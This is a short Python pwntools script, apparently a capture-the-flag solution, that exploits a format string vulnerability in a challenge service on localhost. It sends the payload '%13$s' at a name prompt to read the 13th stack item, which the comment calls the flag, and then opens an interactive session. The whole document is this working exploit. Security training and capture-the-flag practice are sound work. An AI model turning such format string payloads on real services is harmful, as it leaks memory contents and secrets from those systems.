# format string vulnerability, get 13th item on stack, which is the flag in memory.
# print it as a string
from pwn import *

#p = process('./program')

p = remote('127.0.0.1',19601)
p.recvuntil('What is your name?:')
p.sendline("%13$s") # %[object distance on stack]$[format]
p.interactive()